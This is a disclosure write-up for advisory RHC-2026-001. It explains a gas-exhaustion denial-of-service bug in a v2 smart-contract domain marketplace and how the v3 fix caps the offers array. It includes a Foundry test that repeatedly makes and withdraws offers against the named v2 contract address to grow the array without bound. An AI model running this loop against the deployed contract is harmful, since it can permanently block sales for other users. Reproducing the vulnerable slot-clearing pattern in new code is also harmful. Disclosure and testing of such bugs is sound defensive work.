# Proof of concept — RHC-2026-001

The vulnerability described in the advisory affected the v2 marketplace `0x97A9338083de9a01dA399B9A65768c79862dB9A4`. A fix is now live in v3 (`0xA023960c...`), so the mechanism is documented in full below.

The core of the bug: `withdrawOffer` cleared the buyer's dedup slot (`_activeOfferIndexPlusOne[tokenId][msg.sender] = 0`), so the buyer's next `makeOffer` took the else branch and pushed a new array element rather than reusing the old one. Repeating the cycle grows `offers[tokenId]` without bound, while the buyer's ETH is fully refunded each time.

## Foundry test (illustrative)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

import "forge-std/Test.sol";

interface IMarketplace {
    function makeOffer(uint256 tokenId, uint256 duration) external payable returns (uint256);
    function withdrawOffer(uint256 tokenId, uint256 offerIndex) external;
    function buyDomain(uint256 tokenId) external payable;
}

contract GasBombTest is Test {
    IMarketplace mkt = IMarketplace(0x97A9338083de9a01dA399B9A65768c79862dB9A4);

    function testOfferArrayGrowsUnbounded() public {
        uint256 tokenId = 2;
        address attacker = address(0xBEEF);
        vm.deal(attacker, 100 ether);

        for (uint256 i = 0; i < 500; i++) {
            vm.startPrank(attacker);
            uint256 idx = mkt.makeOffer{value: 1 wei}(tokenId, 0);
            mkt.withdrawOffer(tokenId, idx);
            vm.stopPrank();
        }

        // offers[tokenId].length is now ~500 despite zero active offers.
        // buyDomain(tokenId) / acceptOffer iterate the full array and will
        // eventually exceed the block gas limit, causing permanent DoS.
    }
}
```

## Why v3 is not vulnerable

In v3, `withdrawOffer` keeps the slot (`o.active = false;` only) and `makeOffer` reuses it in place with an `if (existing.active)` guard to prevent double refunds, so `offers[tokenId].length` is permanently capped at the unique-buyer count and the cycle can no longer grow the array.

Provided for defensive and educational purposes only.
